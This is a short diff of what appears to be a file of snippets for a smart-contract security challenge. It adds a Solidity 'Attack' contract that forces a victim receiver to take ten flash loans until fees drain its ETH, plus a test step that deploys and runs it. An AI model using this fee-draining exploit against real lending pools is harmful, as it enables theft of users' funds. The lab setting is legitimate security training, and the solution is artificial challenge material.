@@ -32,15 +32,18 @@ contract Attack {
     function init(address payable _pool, address _receiver) public {
         IERC3156FlashBorrower receiver = IERC3156FlashBorrower(_receiver);
         NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);
+        
         for (uint256 i = 0; i < 10; i++) {
             pool.flashLoan(receiver, ETH, 1 ether, "x0");
         }
     }
 }`,
                 `it("Execution", async function () {
-  await token
-      .connect(player)
-      .transfer(vault.address, ethers.utils.parseEther("1"));
+    const attackContract = await (
+        await ethers.getContractFactory("Attack", deployer)
+    ).deploy();
+
+    attackContract.init(pool.address, receiver.address);
 });`,
             ],
         },
